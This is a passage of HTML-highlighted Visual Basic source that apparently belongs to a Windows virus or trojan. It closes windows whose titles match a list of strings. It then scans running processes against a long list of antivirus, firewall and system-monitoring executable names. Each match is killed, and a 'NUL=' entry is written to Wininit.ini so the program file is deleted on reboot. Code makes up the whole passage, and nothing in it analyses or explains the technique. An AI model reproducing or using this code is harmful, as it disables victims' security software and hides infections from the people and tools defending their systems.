</span><span class="sc7">Wt</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetWindowText</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">VirTitle</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">VirTitle</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc7">VirWindow</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">VirTitle</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Wt</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">VirWindow</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">Vc</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">Wc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">PostMessage</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">WM_CLOSE</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNull</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNull</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
    
</span><span class="sc7">FuncSearchScan</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetWinVersion</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">OSinfo</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">OSVERSIONINFO</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">retvalue</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
    
    </span><span class="sc3">With</span><span class="sc0"> </span><span class="sc7">OSinfo</span><span class="sc0">
        </span><span class="sc6">.</span><span class="sc7">dwOSVersionInfoSize</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">148</span><span class="sc0">
        </span><span class="sc6">.</span><span class="sc7">szCSDVersion</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space$</span><span class="sc6">(</span><span class="sc2">128</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">retvalue</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetVersionExA</span><span class="sc6">(</span><span class="sc7">OSinfo</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">GetWinVersion</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">.</span><span class="sc7">dwPlatformId</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">With</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">KAnti98</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">BResult1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">BResult2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">OProcces</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">TProcces</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">CProcces</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">BProcces</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">PROCESSENTRY32</span><span class="sc0">

</span><span class="sc7">BResult1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateToolhelp32Snapshot</span><span class="sc6">(</span><span class="sc7">TH32CS_SNAPPROCESS</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">BProcces.dwSize</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">BProcces</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">BResult2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Process32First</span><span class="sc6">(</span><span class="sc7">BResult1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">BProcces</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">BResult2</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">BScan</span><span class="sc6">(</span><span class="sc7">BProcces.szexeFile</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">

</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Bf2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Bpf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Bf2.OpenTextFile</span><span class="sc6">(</span><span class="sc7">Bf2.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Wininit.ini"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Bpf.write</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"NUL="</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">MsD</span><span class="sc6">(</span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">BProcces.szexeFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">BProcces.szexeFile</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc7">Bpf.Close</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Bf2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Nothing</span><span class="sc0">

</span><span class="sc7">OProcess</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">OpenProcess</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">BProcces.th32ProcessID</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">TProcess</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TerminateProcess</span><span class="sc6">(</span><span class="sc7">OProcess</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">CProcess</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CloseHandle</span><span class="sc6">(</span><span class="sc7">OProcess</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">BResult2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Process32Next</span><span class="sc6">(</span><span class="sc7">BResult1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">BProcces</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">Loop</span><span class="sc0">

</span><span class="sc7">CProcces</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CloseHandle</span><span class="sc6">(</span><span class="sc7">BResult1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">BScan</span><span class="sc6">(</span><span class="sc7">ExeNm</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">BScanExe</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">"avp32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avpmon.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"zonealarm.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vshwin32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vet95.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"tbscan.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"serv95.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Nspclean.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"clrav.com"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"scan32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"rav7.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"navw.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"outpost.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nmain.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"navnt.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mpftray.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"lockdown2000.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"icssuppnt.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"icload95.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"iamapp.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"findviru.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"f-agnt95.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"dv95.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"dv95_o.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"claw95ct.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cfiaudit.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avwupd32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avptc32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"_avp32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avgctrl.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"apvxdwin.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"_avpcc.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avpcc.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"wfindv32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vsecomr.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"tds2-nt.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"sweep95.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"EFINET32.EXE"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"scrscan.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"safeweb.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"persfw.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"navsched.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nvc95.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nisum.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"navlu32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ALOGSERV"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"AMON9X"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"AVGSERV9"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"AVGW"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avkpop"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avkservice"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"AvkServ"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avkwctl9"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"AVXMONITOR9X"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"AVXMONITORNT"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"AVXQUAR"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"moolive.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"jed.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"icsupp95.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ibmavsp.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"frw.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"f-stopw.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"espwatch.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"procexp"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"filemon.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"regmon.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"dvp95.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cfiadmin.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avwin95.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avpm.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avp.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ave32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"anti-trojan.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"webscan.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"webscanx.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vsscan40.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"tds2-98.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"SymProxySvc"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"SYMTRAY"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"TAUMON"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"TCM"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"TDS-3"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"TFAK"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vbcmserv"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"VbCons"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"VIR-HELP"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"VPC32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"VPTRAY"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"VSMAIN"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vsmon"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"WIMMUN32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"WGFE95"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"WEBTRAP"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"WATCHDOG"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"WrAdmin"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"sphinx.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"scanpm.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"rescue.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pcfwallicon.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pavcl.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nupgrade.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"navwnt.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"navapw32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"luall.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"iomon98.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"icmoon.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fprot.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"f-prot95.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"esafe.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cleaner3.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"IBMASN.EXE"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"AVXW"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cfgWiz"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"CMGRDIAN"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"CONNECTIONMONITOR"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"CPDClnt"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"DEFWATCH"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"CTRL"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"defalert"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"defscangui"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"DOORS"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"EFPEADM"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ETRUSTCIPE"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"EVPN"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"EXPERT"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fameh32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fch32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fih32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"blackice.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avsched32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avpdos32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avpnt.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avconsol.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ackwin32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"NWTOOL16"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pccwin97"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"PROGRAMAUDITOR"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"POP3TRAP"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"PROCESSMONITOR"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"PORTMONITOR"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"POPROXY"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pcscan"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pcntmon"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pavproxy"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"PADMIN"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pview95"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"rapapp.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"REALMON"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"RTVSCN95"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"vsstat.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"vettray.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"tca.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"smc.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"scan95.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"rav7win.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pccwin98.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"KPFW32.EXE"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ADVXDWIN"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"padmin.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"normist.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"navw32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"n32scan.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"lookout.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"iface.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"icloadnt.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"SPYXX"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"SS3EDIT"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"SweepNet"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"iamserv.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fp-win.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"f-prot.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ecengine.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cleaner.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cfind.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"blackd.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"RULAUNCH"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"sbserv"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"SWNETSUP"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"WrCtrl"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"avpupd.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avkserv.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"autodown.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"_avpm.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avpm.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"regedit.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"msconfig.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"FPROT95.EXE"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"IBMASN.EXE"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"sfc.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"regedt32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"offguard.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pav.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pavmail.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"per.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"perd.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"pertsk.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"perupd.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pervac.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pervacd.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"th.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"th32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"th32upd.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"thav.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"thd.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"thd32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"thmail.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"alertsvc.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"amon.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"kpf.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"antivir"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avsynmgr.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cfinet.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cfinet32.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"icmon.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"lockdownadvanced.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"lucomserver.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mcafee"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"navapsvc.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"navrunr.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nisserv.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
